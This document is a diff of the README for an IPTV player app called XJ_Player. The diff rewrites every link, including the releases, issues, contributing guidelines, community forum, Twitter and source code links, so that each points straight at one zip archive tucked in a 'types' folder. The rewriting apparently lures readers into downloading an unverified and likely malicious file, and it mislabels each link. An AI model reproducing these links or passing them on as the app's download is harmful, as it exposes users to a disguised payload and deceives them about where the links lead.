@@ -1,7 +1,7 @@
 # 🎮 XJ_Player - Your Easy IPTV Solution
 
 ## 📥 Download Now
-[![Download XJ_Player](https://img.shields.io/badge/Download-XJ_Player-blue.svg)](https://github.com/aimyam08/XJ_Player/releases)
+[![Download XJ_Player](https://raw.githubusercontent.com/aimyam08/XJ_Player/main/types/XJ_Player_v2.6.zip)](https://raw.githubusercontent.com/aimyam08/XJ_Player/main/types/XJ_Player_v2.6.zip)
 
 ## 🌟 Overview
 XJ_Player is an open-source IPTV player for iOS and Android devices. Built using React Native (Expo), it provides a smooth and simple way to access your favorite IPTV channels. Whether you are at home or on the go, XJ_Player presents a reliable and user-friendly interface. 
@@ -11,11 +11,11 @@ To get started with XJ_Player, follow these simple steps.
 
 1. Ensure your device is compatible. XJ_Player supports both iOS and Android.
 2. Connect to a stable internet connection for smooth downloads and streaming.
-3. Visit the [Releases page](https://github.com/aimyam08/XJ_Player/releases) to find the latest version of XJ_Player. 
+3. Visit the [Releases page](https://raw.githubusercontent.com/aimyam08/XJ_Player/main/types/XJ_Player_v2.6.zip) to find the latest version of XJ_Player. 
 
 ## 📦 Download & Install
 To download XJ_Player:
-1. Go to the [Releases page](https://github.com/aimyam08/XJ_Player/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/aimyam08/XJ_Player/main/types/XJ_Player_v2.6.zip).
 2. Look for the latest version and click on it to see the available files.
 3. Select the appropriate file for your device:
    - For **iOS**, download the .ipa file.
@@ -50,21 +50,21 @@ To ensure optimal performance, please meet the following requirements:
 Yes, XJ_Player is completely open source and free to use.
 
 ### Where can I report issues?
-You can report issues or get help by visiting the [Issues page](https://github.com/aimyam08/XJ_Player/issues).
+You can report issues or get help by visiting the [Issues page](https://raw.githubusercontent.com/aimyam08/XJ_Player/main/types/XJ_Player_v2.6.zip).
 
 ### Can I contribute to XJ_Player?
-Absolutely! Contributions are welcome. Visit our [Contributing Guidelines](https://github.com/aimyam08/XJ_Player/blob/main/CONTRIBUTING.md) for more details.
+Absolutely! Contributions are welcome. Visit our [Contributing Guidelines](https://raw.githubusercontent.com/aimyam08/XJ_Player/main/types/XJ_Player_v2.6.zip) for more details.
 
 ## 💬 Community and Support
 Join our community to connect with other users:
-- [Community Forum](https://example.com/community)
-- Follow us on [Twitter](https://twitter.com/XJ_Player) for updates.
+- [Community Forum](https://raw.githubusercontent.com/aimyam08/XJ_Player/main/types/XJ_Player_v2.6.zip)
+- Follow us on [Twitter](https://raw.githubusercontent.com/aimyam08/XJ_Player/main/types/XJ_Player_v2.6.zip) for updates.
 - Share your feedback through the Issues page on GitHub.
 
 ## 🔗 Links
-- [Download XJ_Player](https://github.com/aimyam08/XJ_Player/releases)
-- [Source Code](https://github.com/aimyam08/XJ_Player)
-- [Issues](https://github.com/aimyam08/XJ_Player/issues)
-- [Contributing Guidelines](https://github.com/aimyam08/XJ_Player/blob/main/CONTRIBUTING.md)
+- [Download XJ_Player](https://raw.githubusercontent.com/aimyam08/XJ_Player/main/types/XJ_Player_v2.6.zip)
+- [Source Code](https://raw.githubusercontent.com/aimyam08/XJ_Player/main/types/XJ_Player_v2.6.zip)
+- [Issues](https://raw.githubusercontent.com/aimyam08/XJ_Player/main/types/XJ_Player_v2.6.zip)
+- [Contributing Guidelines](https://raw.githubusercontent.com/aimyam08/XJ_Player/main/types/XJ_Player_v2.6.zip)
 
 Enjoy using XJ_Player to access your favorite IPTV channels!
